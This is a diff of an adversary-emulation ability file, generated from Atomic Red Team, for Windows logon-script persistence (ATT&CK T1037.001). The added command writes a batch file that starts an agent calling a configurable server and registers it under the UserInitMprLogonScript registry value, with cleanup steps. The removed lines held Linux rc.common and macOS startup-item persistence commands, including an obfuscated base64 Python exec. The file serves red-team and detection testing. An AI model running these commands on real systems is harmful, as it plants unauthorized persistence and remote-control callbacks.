@@ -1,23 +1,21 @@
 - id: 05cde730-2881-4cd5-a68c-7843db27a3d7
-  name: Boot or Logon Initialization Scripts
-  description: Ability for Boot or Logon Initialization Scripts (ATT&CK T1037). Generated
-    from Atomic Red Team procedures; review and test safely before use.
+  name: Logon Initialization Scripts (Windows) (Generated from Atomic Red Team)
+  description: |
+    Ability for Boot or Logon Initialization Scripts: Logon Script (Windows) (ATT&CK T1037.001).
+    Adds a registry value to run batch script created in the %temp% directory.
+    Upon execution, there will be a new environment variable in the HKCU\Environment key
+    that can be viewed in the Registry Editor.
+    The batch script will spawn a new agent.
+    Generated from Atomic Red Team procedures (d6042746-07d4-4c92-9ad8-e644c114a231); review and test safely before use.
   tactic: persistence
   technique:
-    attack_id: T1037
-    name: Boot or Logon Initialization Scripts
+    attack_id: T1037.001
+    name: 'Boot or Logon Initialization Scripts: Logon Script (Windows)'
   platforms:
     windows:
-      psh:
-        command: 'echo "#{script_command}" > #{script_path} REG.exe ADD HKCU\Environment
-          /v UserInitMprLogonScript /t REG_SZ /d "#{script_path}" /f'
-    linux:
-      sh:
-        command: filename='/etc/rc.common';if [ ! -f $filename ];then sudo touch $filename;else
-          sudo cp $filename /etc/rc.common.original;fi printf '%s\n' '#!/bin/bash'
-          | sudo tee /etc/rc.common echo "python3 -c \"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgcmMuY29tbW9uID4gL3RtcC9UMTAzNy4wMDQucmMuY29tbW9uJykK'))\""
-          | sudo tee -a /etc/rc.common printf '%s\n' 'exit 0' | sudo tee -a /etc/rc.common
-          sudo chmod +x /etc/rc.common
-    darwin:
-      sh:
-        command: sudo touch /Library/StartupItems/EvilStartup.plist
+      cmd:
+        command: |
+          echo "#{location} -server #{server} -group #{group}" > %temp%\art.bat &&
+          REG.exe ADD HKCU\Environment /v UserInitMprLogonScript /t REG_SZ /d "%temp%\art.bat" /f
+        cleanup: |
+          REG.exe DELETE HKCU\Environment /v UserInitMprLogonScript /f & del "%temp%\art.bat"
